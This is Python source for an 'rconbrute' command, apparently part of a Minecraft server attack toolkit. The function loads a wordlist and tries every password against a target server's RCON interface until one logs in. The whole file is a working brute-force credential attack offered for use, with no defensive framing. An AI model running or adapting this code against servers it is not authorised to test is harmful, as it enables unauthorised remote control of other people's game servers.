import time
import os

from modules.minecraft.rcon.mcrcon import MCRcon, MCRconException

from ui.colors import paint
from utils.network import GetUtilities
from utils.validation import CheckUtilities


def rconbrute(server, password_file, *args):
    

    try:
        attack_finished = False
        password_found = False
        password = ''

        if not os.path.exists(password_file):
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "invalidFile"]).replace("[0]", password_file)}')
            return
        
        if not CheckUtilities.check_ip_port(server):
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "InvalidRconFormat"])}')
            return
    
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "preparingTheAttack"])}')
        time.sleep(1)

        with open(password_file, 'r', encoding=CheckUtilities.check_file_encoding(password_file)) as f:
            passwords = f.readlines()

        if len(passwords) == 0:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "sendcmd", "emptyFile"])}')
            return
        
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "numberOfPasswords"]).replace("[0]", password_file).replace("[1]", str(len(passwords)))}')
        time.sleep(1)

        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "startingTheAttack"])}')
        time.sleep(1)

        server = server.split(':')

        while True:
            if attack_finished:
                if password_found:
                    paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "passwordFound"]).replace("[0]", password)}')

                else:
                    paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "passwordNotFound"])}')

                break

            for password in passwords:
                password = password.replace('\n', '')
                paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "tryingPassword"]).replace("[0]", password)}')

                try:
                    with MCRcon(server[0], password, int(server[1]), timeout=35) as mcr:
                        mcr.disconnect()
                    
                    password_found = True
                    break

                except MCRconException:
                    continue

            attack_finished = True

    except TimeoutError:
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "timeout"])}')

    except ConnectionRefusedError:
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "connectionRefused"])}')

    except Exception as e:
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "error"]).replace("[0]", str(e))}')
                
    except KeyboardInterrupt:
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["commands", "ctrlC"])}')

